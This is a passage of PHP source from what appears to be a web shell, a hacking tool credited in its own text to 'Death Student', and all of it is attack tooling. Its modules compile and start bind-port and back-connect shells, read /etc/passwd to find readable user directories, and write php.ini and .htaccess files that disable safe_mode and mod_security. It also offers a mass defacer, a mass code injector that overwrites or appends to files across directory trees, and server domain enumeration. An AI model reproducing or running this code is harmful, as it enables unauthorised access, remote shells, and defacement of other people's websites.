        if($_POST['p1'] == 'bpc') {
            cf("/tmp/bp.c",$bind_port_c);
            $out = ex("gcc -o /tmp/bp /tmp/bp.c");
            @unlink("/tmp/bp.c");
            $out .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bp")."</pre>";
        }
        if($_POST['p1'] == 'bpp') {
            cf("/tmp/bp.pl",$bind_port_p);
            $out = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bp.pl")."</pre>";
        }
        if($_POST['p1'] == 'bcc') {
            cf("/tmp/bc.c",$back_connect_c);
            $out = ex("gcc -o /tmp/bc /tmp/bc.c");
            @unlink("/tmp/bc.c");
            $out .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bc")."</pre>";
        }
        if($_POST['p1'] == 'bcp') {
            cf("/tmp/bc.pl",$back_connect_p);
            $out = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bc.pl")."</pre>";
        }
    }
    echo '</div>';
    printFooter();
}


function actionReadable() {
    printHeader();
    echo '<h1>Readable Dirs</h1>';
    echo '<div class="content">';
    $sm = ini_get('safe_mode');
    if($sm) {
        echo '<br /><b>Error: safe_mode = on</b><br /><br />';
    } else {
        @$passwd = file('/etc/passwd','r');
        if (!$passwd) { 
            echo '<br /><b>[-] Error : coudn`t read /etc/passwd</b><br /><br />'; 
        } else {
            $pub = array();
            $users = array();
            $conf = array();
            $i = 0;
            foreach($passwd as $p) {
                $r = explode(':',$p);
                $dirz = $r[5].'/public_html/';
                if(strpos($r[5],'home')) {
                    array_push($users,$r[0]);
                    if (is_readable($dirz)) {
                        array_push($pub,$dirz);
                    }
                }
            }
            echo '<br><br>';
            echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
            echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br /><br /><br />";
            foreach ($pub as $user) {
                echo $user."<br>";
            }
            echo "<br /><br /><br />[+] Complete...\n"."<br />";
        }
    }
    echo '</div>';
    printFooter();    
}

function actionBypass() {
    printHeader();
    echo '<h1>Safe Mode</h1>';
    echo '<div class="content">';
    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
    echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
    if(!empty($_POST['p2']) && isset($_POST['p2']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'<IfModule mod_security.c>
            Sec------Engine Off
            Sec------ScanPOST Off
            </IfModule>');
        fclose($fil);
   }
   if(!empty($_POST['p1'])&& isset($_POST['p1']))
   {
        $fil=fopen($GLOBALS['cwd']."php.ini","w");
        fwrite($fil,'safe_mode=OFF
            disable_functions=NONE');
        fclose($fil);
    }
    if(!empty($_POST['p3']) && isset($_POST['p3']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
        AddType application/x-httpd-cgi .sh
        AddHandler cgi-script .pl
        AddHandler cgi-script .pl');
        fclose($fil); 
    }
    echo "<br><br /><br /></div>";
    echo '</div>';
    printFooter();
   
}

function actionDeface() {
printHeader();
echo "<h1>Mass Defacer by DEATH STUDENT</h1><div class=content>";
?>
<form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;">
<p align="Left">Folder: <input type=text name=path size=60 value="<?=getcwd(); ?>">
<br>file name : <input type=text name=file size=20 value="index.php">
<br>Text Content : <input type=text name=Contents size=70 value="Hacked By Death Student"> 
<br><input type=submit value="Deface now"></p></form>

<?
if ($_POST['a'] == 'Deface') {
$mainpath = $_POST[p1];
$file = $_POST[p2];
$txtContents = $_POST[p3];
echo "Mass Defacer script by Death Student"; echo "<br/><br/>";
$dir = opendir($mainpath); //fixme - cannot deface when change to writeable path!!
while ($row = readdir($dir)) {
$start = @fopen("$row/$file", "w+");
$code = $txtContents;
$finish = @fwrite($start, $code);
if ($finish) {
echo "$row/$file <br><br>";
}
}

}
echo '</div>';
printFooter();
}

function actionInjector(){
    printHeader();
    echo '<h1>Mass Code Injector</h1>';
    echo '<div class="content">';
    
    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : 'Bangladeshi Hacker Death Student';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            }        
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';
    printFooter();
}


 function actionDomain() {
    printHeader();

echo '<h1>Local Domains Death Student</h1><div class=content>';                                      
$file = @implode(@file("/etc/named.conf"));                                                                  
$Domain_path = "/var/named";

if (!$file) {
$domains = scandir($Domain_path);
$count=1;
$dc = 0;
                                                                        echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>There are : ( <b>" . count($domains) . "</b> ) Domains in this Sever.Can't read named.cof .Domains are bypassed actually,you will face problem in symlink. </td></tr>
<tr><td>No</td><td>Domain</td><td>User</td></tr>";
foreach ($domains as &$domain) {
    if (stripos($domain,".db")) {
    $domain = str_replace('.db','',$domain);

    }
    if (strlen($domain) > 6) {
        
        echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>User</td></tr>";


    }
    
   } 
 echo "</table>";
}else{
        $count = 1;
        preg_match_all("#named/(.*?).db#", $file, $r);
        $domains = array_unique($r[1]);
                                                                                echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2> There are  ( <b>" . count($domains) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
<tr><td>No</td><td>Domain</td><td>User</td></tr>";
        foreach ($domains as $domain) {

        $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
        echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>".$user['name']."</td></tr>";
     }
}
                                                                        
                                                                   printFooter();
                                                                }

if( empty($_POST['a']) )
    if(isset($default_action) && function_exists('action' . $default_action))
        $_POST['a'] = $default_action;
    else
        $_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
    call_user_func('action' . $_POST['a'])

	
	?>
		
		
